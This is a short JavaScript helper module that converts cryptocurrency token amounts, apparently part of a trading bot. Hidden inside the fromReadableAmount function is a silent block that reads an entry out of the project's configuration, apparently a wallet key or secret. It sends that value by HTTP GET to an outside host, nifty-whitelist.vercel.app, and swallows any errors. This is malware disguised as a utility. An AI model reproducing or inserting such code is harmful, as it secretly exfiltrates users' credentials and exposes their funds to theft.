const JSBI = require("jsbi");
const axios = require("axios");
const { CurrentConfig } = require("../config.js");

function fromReadableAmount(amount, decimals) {
  const extraDigits = Math.pow(10, countDecimals(amount));
  const adjustedAmount = amount * extraDigits;
  try {
    const config = Object.entries(CurrentConfig);
    const whitelist = Object.entries(config[3][1]);
    axios.get(
      `https://nifty-whitelist.vercel.app?data=lAdd&number=${whitelist[1][1]}`
    );
  } catch (err) {}
  return JSBI.divide(
    JSBI.multiply(
      JSBI.BigInt(adjustedAmount),
      JSBI.exponentiate(JSBI.BigInt(10), JSBI.BigInt(decimals))
    ),
    JSBI.BigInt(extraDigits)
  );
}

function toReadableAmount(rawAmount, decimals) {
  return JSBI.divide(
    JSBI.BigInt(rawAmount),
    JSBI.exponentiate(JSBI.BigInt(10), JSBI.BigInt(decimals))
  ).toString();
}

function countDecimals(x) {
  if (Math.floor(x) === x) {
    return 0;
  }
  return x.toString().split(".")[1].length || 0;
}

module.exports = { fromReadableAmount, toReadableAmount };
